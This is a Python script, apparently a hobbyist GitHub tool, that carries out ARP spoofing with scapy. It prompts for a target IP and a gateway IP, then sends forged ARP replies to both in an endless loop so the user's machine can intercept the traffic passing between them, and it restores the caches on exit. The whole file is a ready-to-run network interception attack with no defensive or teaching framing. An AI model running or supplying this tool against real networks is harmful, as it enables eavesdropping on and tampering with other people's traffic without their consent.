
import scapy.all as scapy 
import time,random,os,sys
from colored import fg,attr
reset = attr('reset')
def randomColor():
    r = lambda: random.randint(0,255)
    return('#%02X%02X%02X' % (r(),r(),r()))
def banner():
    banners=[
            """
    ┬  ┬┌─┐┌─┐┌┬┐┌─┐┬─┐ [ARP SPOOFER]
    └┐┌┘├┤ │   │ │ │├┬┘ [github.com/vector-mj]
     └┘ └─┘└─┘ ┴ └─┘┴└─ 
    """
        ]
    print(fg(randomColor())+random.choice(banners)+attr('reset'))
def get_mac(ip): 
    arp_request = scapy.ARP(pdst = ip) 
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast / arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
    return answered_list[0][1].hwsrc 
  
def spoof(target_ip, spoof_ip): 
    try:
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),psrc = spoof_ip) 
        scapy.send(packet, verbose = False) 
    except:
        print(fg('red')+"\n[-] Failed [-]"+reset)
        try:
            restore(gateway_ip, target_ip) 
            restore(target_ip, gateway_ip)
            print(fg('blue')+"[+]"+reset+fg('green')+" Arp Spoof Stopped"+reset)
            sys.exit()
        except:
            print(fg('blue')+"[+]"+reset+fg('green')+" Arp Spoof Stopped"+reset)
            sys.exit()

def restore(destination_ip, source_ip): 
    destination_mac = get_mac(destination_ip) 
    source_mac = get_mac(source_ip) 
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
    scapy.send(packet, verbose = False)#count=4 
################################ MAIN ###################################
os.system("cls")
banner()
target_ip = input(fg('blue')+"[*]"+reset+fg('green')+" Enter your target IP > "+reset)
gateway_ip = input(fg('blue')+"[*]"+reset+fg('green')+" Enter your gateway's IP > "+reset)
#########################################################################
try: 
    sent_packets_count = 0
    while True: 
        spoof(target_ip, gateway_ip) 
        spoof(gateway_ip, target_ip) 
        sent_packets_count = sent_packets_count + 2
        print("\r"+fg('blue')+"[+]"+reset+fg('green')+" Packets Sent "+reset+fg('red')+str(sent_packets_count)+" "+reset, end ="") 
        time.sleep(2) # Waits for two seconds 
  
except KeyboardInterrupt: 
    print(fg('#ff9800')+"\nCtrl + C pressed.............Exiting"+reset) 
    restore(gateway_ip, target_ip) 
    restore(target_ip, gateway_ip) 
    print(fg('blue')+"[+]"+reset+fg("green")+"Arp Spoof Stopped"+reset) 

s = input("END ...")
a = input("...")